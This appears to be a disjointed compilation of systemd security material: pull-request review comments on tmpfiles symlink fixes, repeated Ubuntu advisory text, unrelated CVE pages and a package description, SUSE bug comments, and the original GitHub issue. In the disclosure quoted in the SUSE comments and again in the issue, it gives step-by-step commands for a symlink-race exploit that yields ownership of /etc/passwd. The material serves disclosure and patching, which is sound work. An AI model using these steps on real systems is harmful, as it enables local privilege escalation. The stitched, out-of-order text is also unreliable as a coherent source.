It's an RFC as a starting point to fix [#7986](https://github.com/systemd/systemd/issues/7986) completely.

Currently this makes 'f' completely safe only. If this appears to be an acceptable fix, I'll fix the rest of the operations.

Sorry, something went wrong.

Downgrade-to-bool is frowned upon. Better to write this as

hmm, so we follow symlinks for writing but not for application of perms. This deserves some comment here. (because otherwise the next one looking at this, like me, might think that fd\_set\_perms() would be the right call to make here, rather than path\_set\_perms()...

`flags` has just a single use. I'd prefer to not have the variable and just put the flags definition in `open` below, and add the comment there.

also, here too we'll stat the file twice in the end, I think it would be much nicer to pass "struct stat" if we have it, like in this case, and only query it in fd\_set\_perms() if we don't.

| [@keszybz](https://github.com/keszybz) before going into the details of fixing the code, I'd like to know if the general idea is acceptable.  As described in one commit this can break compatibility in some cases as "unsafe" transitions (the definition of unsafe is given by chase\_`symlink(... CHASE_SAFE ...)`) are not followed anymore.  Maybe we could relax a bit the security checks and consider a transition unsafe only if it's done via a symlink ? |

i don't like this i must say, because this means that path\_set\_perms() will then effectively stat all dirs twice...

A better approach might be to accept st being passed as NULL here, and if it is, gather the data fresh, so that callers may but don't have to pass in stat initialized.

```
struct stat stbuf;
…
if (!st) {
        if (fstat(fd, &stbuf) < 0)
                return -errno;
        st = &stbuf;
}
```

hmm, so we follow symlinks for writing but not for application of perms. This deserves some comment here. (because otherwise the next one looking at this, like me, might think that fd\_set\_perms() would be the right call to make here, rather than path\_set\_perms()...

also, here too we'll stat the file twice in the end, I think it would be much nicer to pass "struct stat" if we have it, like in this case, and only query it in fd\_set\_perms() if we don't.

[@poettering](https://github.com/poettering) not really the goal here is to resolve and validate the path only once, therefore we want to call `fd_set_perms()` ultimately (as you expect) and this is done in a separate commit, which makes the function completely safe. |

dropping this looks like something that will trip up gcc sooner or later, as it tends to be too dumb to realize that r is always initialized in the r == -ENOTTY check in the if line immediately following...

Moreover, I'd prefer if we didn't write this code so fragile, as the order of the checks in the following if line suddenly matters, which is very much not obvious

why this change? we should always propagate error codes we get to the journal, and that's what log\_debug\_errno() does

| Erf sorry I forgot to reply to your comment.  So I saw your comment about fstat() but I'm not sure yet...  If you look at the end result of the patch series you'll see that only fd\_set\_perms() might be a concern (the other helpers doesn't need to stat the file at all).  Even in this case fstat() might be performed by 2 callers of fd\_set\_perms() but they're still corner cases:   * in create\_file(), it's only done in the error code path * in truncate\_file(), the stat info might be outdated because we might truncate the file   The second case shows that if we rely (optionally) on the caller to pass the stat info, they might be outdated...  Also I think the minor simplification done in item\_do() is valid but I'll split the patch so this part can be reviewed separately. |

hmm, we generally try to use O\_NONBLOCK rather than O\_NDELAY all across our codebase, since O\_NDELAY is an older obsolete name... in fact we even have a coccinelle script in place that fixes that (see coccinelle/o-ndelay.cocci)

hmm, this should be clarified a bit. if we have a symlink change "a → b → [non-existing]", then resolving "a" would return "a" rather than "b", hence it's final only in the sense that it is the last part of the path, not the last part of the chain

so the biggie is that fd\_get\_path() should not be used if we can avoid it due to its ambiguity and unreliability. It's a bit hacky to use it at all, but i figure it's ok if it allows us to use openat() style apis more comprehensively, hence I am ok with it, but then at least we should not ignore the path if we have it anyway like your patch does it now

is there any reason not to allow the root dir here?

this means people can't use tmpfiles to let's say add an xattr on the root dir. Why prohibit that though?

The "main" flags are set here, i.e. the one which are related to the creation of the file. But I wouldn't pay too much attention for this as it's gone in the end.

we should use fd\_get\_path() only if we have to. i.e. when mac\_smack\_fix() is called, i.e. we know the real filename anyway, use that. fd\_get\_path() is problematic due the `(deleted)` ambiguity, and because of chroot and stuff...

as for the smack stuff: please use any real path we might have if possible. fd\_get\_path() should be the fallback if we have nothing better, but only then

he new() allocation further up is now a bit sloppy, as it calculates 3 instead of just 2 btyes if t is the empty string... but i figure that doesn't matter

yeah at least it makes the allocation simpler by allocating the largest size we will need.

as with the selinux code we should use 'path' as it is if it's already absolute, and use fd\_get\_path() only if we the path is not absolute yet

My attempts at backporting the PR have more or less failed. My next approach is to simply backport all of the current tmpfiles.c (or any better version) to v215. |

## Details

Jann Horn discovered that unit\_deserialize incorrectly handled status messages

above a certain length. A local attacker could potentially exploit this via

NotifyAccess to inject arbitrary state across re-execution and obtain root

privileges. ([CVE-2018-15686](/security/CVE-2018-15686))

Jann Horn discovered a race condition in chown\_one(). A local attacker

could potentially exploit this by setting arbitrary permissions on certain

files to obtain root privileges. This issue only affected Ubuntu 18.04 LTS

and Ubuntu 18.10. ([CVE-2018-15687](/security/CVE-2018-15687))

It was discovered that systemd-tmpfiles mishandled symlinks in

non-terminal path components. A local attacker could potentially exploit

this by gaining ownership of certain files to obtain root privileges. This

issue only affected Ubuntu 16.04 LTS and Ubuntu 18.04 LTS. ([CVE-2018-6954](/security/CVE-2018-6954))

# CVE-2019-6454

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2019-6446.html) [[Index]](index.html) [[Next]](CVE-2019-6455.html)

### Upstream information

[CVE-2019-6454 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6454)

#### Description

An issue was discovered in sd-bus in systemd 239. bus\_process\_object() in libsystemd/sd-bus/bus-objects.c allocates a variable-length stack buffer for temporarily storing the object path of incoming D-Bus messages. An unprivileged local user can exploit this by sending a specially crafted message to PID1, causing the stack pointer to jump over the stack guard pages into an unmapped memory region and trigger a denial of service (systemd PID1 crash and kernel panic).

## Binary packages built by this source

[libnss-myhostname](/ubuntu/xenial/%2Bpackage/libnss-myhostname):
nss module providing fallback resolution for the current hostname

This package contains a plugin for the Name Service Switch, providing host

 name resolution for the locally configured system hostname as returned by

 gethostname(2). It returns all locally configured public IP addresses or -- if

 none are configured, the IPv4 address 127.0.1.1 (which is on the local

 loopback) and the IPv6 address ::1 (which is the local host).

 .

 A lot of software relies on that the local host name is resolvable. This

 package provides an alternative to the fragile and error-prone manual editing

 of /etc/hosts.

 .

 Installing this package automatically adds myhostname to /etc/nsswitch.conf.

This occurs even if the fs.protected_symlinks sysctl is turned on.

I'm not sure it worths to backport them though and taking the risk to get regressions.  Secteam, what do you think ? should we take the risk to fix this in SLE12/SLE15 ? ``` [Comment 4](show_bug.cgi?id=1080919#c4)  Matthias Gerstner   2018-03-09 12:39:14 UTC  ``` Hey Franck,  good work with this pull request.  I think for SLE15 we should take the risk, since it is still under testing anyhow.  For SLE12 we should be careful. This is still quite a severe security issue so we should do something about it. I suppose there is no "simpler but still sufficiently effective" alternative to the upstream change. So we should invest into more intense testing.  Maybe you could devise a suitable test case for systemd on SLE-12 that covers the tmpfiles logic?  I could also offer a source code review of the backport to SLE-12 when it is ready. ``` [Comment 5](show_bug.cgi?id=1080919#c5)  Johannes Segitz   2018-04-10 10:57:43 UTC  ``` I concur, we need to fix this on SLE 12 also. Can you please prepare submissions? ``` [Comment 6](show_bug.cgi?id=1080919#c6)  Franck Bui   2018-04-11 06:43:30 UTC  ``` The problem is that the issue is not entirely fixed, see: <https://github.com/systemd/systemd/issues/7986#issuecomment-371315606>  So I still need to fix this case. ``` [Comment 7](show_bug.cgi?id=1080919#c7)  Johannes Segitz   2018-05-02 12:20:51 UTC  ``` (In reply to Franck Bui from [comment #6](show_bug.cgi?id=1080919#c6)) <https://github.com/systemd/systemd/pull/8822> seems to be moving in the right direction. Thank you for your work ``` [Comment 8](show_bug.cgi?id=1080919#c8)  Johannes Segitz   2018-06-22 12:05:03 UTC  ``` (In reply to Johannes Segitz from [comment #7](show_bug.cgi?id=1080919#c7)) so with the MASTER having reviewed you pull request this should be able to merge. Can you please also provide a maintenance request based on this? Thank you ``` [Comment 9](show_bug.cgi?id=1080919#c9)  Franck Bui   2018-06-25 08:41:09 UTC  ``` Nope it's still not yet finished, there're still some issues to address and given that it's low priority, I don't have time to rework the patchset yet.  Also since it's a considerable rewrite, I'm still wondering if it will be a good idea to backport since it will require a lotof work *and* will have a non negligible risk of regression. Given that this security issue seems to have low impact, I'm wondering... ``` [Comment 20](show_bug.cgi?id=1080919#c20)  Ruediger Oertel   2018-11-27 16:11:28 UTC  ``` I think systemd is absolutely correct refusing user-owned / in this case.  But I also think the user should not have to search for days why his system does not work as expected. Printing the reason for the refused transition would make a lot of sense, IMHO. ``` [Comment 21](show_bug.cgi?id=1080919#c21)  Marcus Meissner   2018-11-28 12:37:14 UTC  ``` So is the idea to replace tmpfiles with the upstream version instead of massive patchsets backporting?  Has the syntax changed?  Otherwise it sounds sensible. ``` [Comment 22](show_bug.cgi?id=1080919#c22)  Franck Bui   2018-11-28 12:57:45 UTC  ``` (In reply to Marcus Meissner from [comment #21](show_bug.cgi?id=1080919#c21)) > So is the idea to replace tmpfiles with the upstream version instead of > massive patchsets backporting? >   As  said in [comment #18](show_bug.cgi?id=1080919#c18), the result of the patchset is pretty similar to the upstream version. But in this case the fix has been imported step by step and that should be safer than importing directly the upstream version.  > Has the syntax changed?  Nope and the patchset shouldn't include any new features unlike the import of the upstream version.  Actually the pending question is more: does it worth fixing CVE-2018-6954 and should we take the risk to import such massive changes ?  If so I think we should use the patchset, at least for SLE15. ``` [Comment 23](show_bug.cgi?id=1080919#c23)  Benjamin Brunner   2018-12-10 13:14:44 UTC  ``` Security, do you think the risk is worth it and would it be acceptable to use the patchset for SLE-15? This is also used in Factory and we haven't received any reports about regressions yet. But I think this needs to be tested very carefully by QAM.  Additionally, would it be ok to do SLE-12 afterwards, if nothing bad occurred with SLE-15, given the complexity of the patches?  Thanks in advance. ``` [Comment 24](show_bug.cgi?id=1080919#c24)  Johannes Segitz   2018-12-12 13:13:27 UTC  ``` (In reply to Benjamin Brunner from [comment #23](show_bug.cgi?id=1080919#c23)) I think we should do it. Doing it first on SLE 15 also sounds like a good idea to spread out the risk.   I wish there would be a better way, but I don't think we can leave it unfixed and so far this seems to be the only other option ``` [Comment 26](show_bug.cgi?id=1080919#c26)  Marcus Meissner   2018-12-22 13:44:43 UTC  ``` via oss-security  Product: systemd (tmpfiles) Versions-affected: 239 and earlier Author: Michael Orlitzky Fixed-in: v240 Bug-report: <https://github.com/systemd/systemd/issues/7986> Acknowledgments:    Franck Bui of SUSE put forth a massive amount of effort to fix this,    and Lennart Poettering consistently provided timely reviews over the    course of a few months.   == Summary ==  Before version 240, the systemd-tmpfiles program will follow symlinks  present in a non-terminal path component while adjusting permissions and  ownership. Often -- and particularly with "Z" type entries -- an  attacker can introduce such a symlink and take control of arbitrary  files on the system to gain root. The "fs.protected_symlinks" sysctl  does not prevent this attack. Version 239 contained a partial fix, but  only for the easy-to-exploit recursive "Z" type entries.   == Details ==  The systemd-tmpfiles program tries to avoid following symlinks in the  last component of a path. To that end, the following trick is used in  src/tmpfiles/tmpfiles.c:     fd = open(path, O_NOFOLLOW|O_CLOEXEC|O_PATH);    ...    xsprintf(fn, "/proc/self/fd/%i", fd);    ...    if (chown(fn, ...  The call to chown will follow the "/proc/self/fd/%i" symlink, but only  once; it will then operate on the real file described by fd.  However, there is another way to exploit the code above. The call to  open() will follow symlinks if they appear in a non-terminal component  of path, even with the O_NOFOLLOW flag set. Citing the open(2) man page,     O_NOFOLLOW     If pathname is a symbolic link, then the open fails, with the error    ELOOP. Symbolic links in earlier components of the pathname will still    be followed.  So, for example, if the path variable contains "/run/foo/a/b" and if "a"  is a symlink, then open() will follow it. If systemd-tmpfiles will be  changing ownership of "/run/foo/a/b" after that of "/run/foo", then the  owner of "/run/foo" can exploit that fact to gain root by replacing  "/run/foo/a" with a symlink. With a Z-type tmpfiles.d entry, the  attacker can create this situation himself.  The "fs.protected_symlinks" sysctl does not protect against these sorts  of attacks. Due to the widespread and legitimate use of symlinks in  situations like these, the symlink protection is much weaker than the  corresponding hardlink protection.   == Exploitation ==  Consider the following entry in /etc/tmpfiles.d/exploit-recursive.conf:     d /var/lib/systemd-exploit-recursive 0755 mjo mjo    Z /var/lib/systemd-exploit-recursive 0755 mjo mjo  Once systemd-tmpfiles has been started once, my "mjo" user will own that  directory:     mjo $ sudo ./build/systemd-tmpfiles --create    mjo $ ls -ld /var/lib/systemd-exploit-recursive    drwxr-xr-x  2 mjo mjo 4.0K 2018-02-13 09:38 /var/lib/systemd...  At this point, I am able to create a directory "foo" and a file  "foo/passwd" under /var/lib/systemd-exploit-recursive. The next time  that systemd-tmpfiles is run (perhaps after a reboot), the tmpfiles.c  function item_do_children() will be called on "foo". Within that  function, there is a macro FOREACH_DIRENT_ALL that loops through the  entries of "foo".  The FOREACH_DIRENT_ALL macro defers to readdir(3), and thus requires the  real directory stream pointer for "foo", because we want it to see  "foo/passwd". However, while the macro is iterating, the "q = action(i,  p)" will be performed on "p" which consists of the path "foo" and some  filename "d", but without reference to its file descriptor. So, between  the time that item_do_children() is called on "foo" and the time that "q  = action(i, p)" is run on "foo/passwd", I have the opportunity to  replace "foo" with a symlink to "/etc", causing "/etc/passwd" to be  affected by the change of ownership and permissions.  But there's more: the FOREACH_DIRENT_ALL macro processes the contents of  "foo" in whatever order readdir() returns them. Since mjo owns "foo", I  can fill it with junk to buy myself as much time as I like before  "foo/passwd" is reached:     mjo $ cd /var/lib/systemd-exploit-recursive    mjo $ mkdir foo    mjo $ cd foo    mjo $ echo $(seq 1 500000) | xargs touch    mjo $ touch passwd  Now, restarting systemd-tmpfiles will change ownership of all of those  files...     mjo $ sudo ./build/systemd-tmpfiles --create  and it takes some time for it to process the 500,000 dummy files before  reaching "foo/passwd". At my leisure, I can replace foo with a symlink:     mjo $ cd /var/lib/systemd-exploit-recursive    mjo $ mv foo bar && ln -s /etc ./foo  After some time, systemd-tmpfiles will eventually reach the path  "foo/passwd", which now points to "/etc/passwd", and grant me root access.  A similar, but more difficult attack works against non-recursive entry  types. Consider the following tmpfiles.d entry:     d /var/lib/systemd-exploit 0755 mjo mjo    d /var/lib/systemd-exploit/foo 0755 mjo mjo    f /var/lib/systemd-exploit/foo/bar 0755 mjo mjo  After "/var/lib/systemd-exploit/foo" is created but before the  permissions are adjusted on "/var/lib/systemd-exploit/foo/bar", there is  a short window of opportunity for me to replace "foo" with a symlink to  (for example) "/etc/env.d". If I'm fast enough, tmpfiles will open  "foo/bar", following the "foo" symlink, and give me ownership of  something sensitive in the "/etc/env.d" directory. However, this attack  is more difficult because I can't arbitrary widen my own window of  opportunity with junk files, as was possible with the "Z" type entries.   == Resolution ==  Commit 936f6bdb, which is present in systemd v239, changes the recursive  loop in two important ways. First, it passes file descriptors -- rather  than parent paths -- to each successive iteration. That allows the next  iteration to use the openat() system call, eliminating the non-terminal  path components from the equation. Second, it ensures that each "open"  call has the O_NOFOLLOW and O_PATH flags to prevent symlinks from being  followed at the current depth. Note: only the recursive loop was made  safe; the call to open() the top-level path will still follow  non-terminal symlinks and is vulnerable to the second attack above.  The commits in pull request 8822 aim to make everything safe from this  type of symlink attack. As far as tmpfiles is concerned, the main idea  is to use the chase_symlinks() function in place of the open() system  call. Since chase_symlinks() calls openat() recursively from the root  up, it will never follow a non-terminal symlink. Commit 1f56e4ce then  introduces the CHASE_NOFOLLOW flag for that function, preventing it from  following terminal symlinks. In subsequent commits (e.g. addc3e30), the  consumers of chase_symlinks() were updated to pass CHASE_NOFOLLOW to  chase_symlinks(), preventing them from following any symlinks.  The complete fix is available in systemd v240. ``` [Comment 29](show_bug.cgi?id=1080919#c29)  Swamp Workflow Management   2019-01-21 20:09:44 UTC  ``` SUSE-SU-2019:0137-1: An update that solves four vulnerabilities and has 7 fixes is now available.

# CVE-2019-3842

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2019-3840.html) [[Index]](index.html) [[Next]](CVE-2019-3843.html)

### Upstream information

[CVE-2019-3842 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3842)

#### Description

In systemd before v242-rc4, it was discovered that pam\_systemd does not properly sanitize the environment before using the XDG\_SEAT variable. It is possible for an attacker, in some particular configurations, to set a XDG\_SEAT environment variable which allows for commands to be checked against polkit policies using the "allow\_active" element rather than "allow\_any".

## Description

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?v=4&size=48)](/orlitzky)[orlitzky](https://github.com/orlitzky)opened [on Jan 24, 2018](https://github.com/systemd/systemd/issues/7986#issue-291222014)

Sorry to keep harassing you with these. I think `open()` is following symlinks that don't appear as the last path component. In other words, if we are at the point where tmpfiles is about to `open(/var/lib/systemd-exploit-recursive/foo/passwd,...)`, then I can replace the "foo" component with a symlink to `/etc`, resulting in `open(/etc/passwd,...)` and a fairly easy root exploit for any `Z` type.

Same disclaimer: I'm running tmpfiles from a git checkout, but not booting systemd. Now I have `fs.protected_hardlinks=1` and `fs.protected_symlinks=1`. I'm using the same tmpfiles.d entry as before,

```
$ cat /etc/tmpfiles.d/exploit-recursive.conf
d /var/lib/systemd-exploit-recursive 0755 mjo mjo
Z /var/lib/systemd-exploit-recursive 0755 mjo mjo

```

I start the service once, so that `/var/lib/systemd-exploit-recursive` exists:

```
$ sudo ./build/systemd-tmpfiles --create

```

Now, as the owner (mjo) of `/var/lib/systemd-exploit-recursive`, I can do, in another terminal,

```
$ cd /var/lib/systemd-exploit-recursive
$ mkdir foo
$ cd foo
$ echo $(seq 1 500000) | xargs touch
$ touch passwd
$ cd ..

```

The 500,000 dummy files buy some time to swap in the symlink before the loop gets to `passwd`. Now, restart the service back in the first terminal...

```
$ sudo ./build/systemd-tmpfiles --create

```

And while that is busy looping on the 500,000 dummy files, swap out `foo` with a symlink in the second terminal:

```
$ mv foo bar && ln -s /etc ./foo

```

(I've used "mv" because "rm" is ironically slow at deleting my own dummy files.)

The end result is that I wind up as the owner of `/etc/passwd`, and the `fs.protected_symlinks` sysctl doesn't protect against this.

## Releases

* [Ubuntu 18.10](/security/notices?release=cosmic)
* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [systemd](/security/cves?package=systemd) - system and service manager

## Details

USN-3816-1 fixed several vulnerabilities in systemd. However, the fix for

[CVE-2018-6954](/security/CVE-2018-6954) was not sufficient. This update provides the remaining fixes.

We apologize for the inconvenience.

Original advisory details:

Jann Horn discovered that unit\_deserialize incorrectly handled status messages

above a certain length. A local attacker could potentially exploit this via

NotifyAccess to inject arbitrary state across re-execution and obtain root

privileges. ([CVE-2018-15686](/security/CVE-2018-15686))

Jann Horn discovered a race condition in chown\_one(). A local attacker

could potentially exploit this by setting arbitrary permissions on certain

files to obtain root privileges. This issue only affected Ubuntu 18.04 LTS

and Ubuntu 18.10. ([CVE-2018-15687](/security/CVE-2018-15687))

It was discovered that systemd-tmpfiles mishandled symlinks in

non-terminal path components. A local attacker could potentially exploit

this by gaining ownership of certain files to obtain root privileges. This

issue only affected Ubuntu 16.04 LTS and Ubuntu 18.04 LTS. ([CVE-2018-6954](/security/CVE-2018-6954))
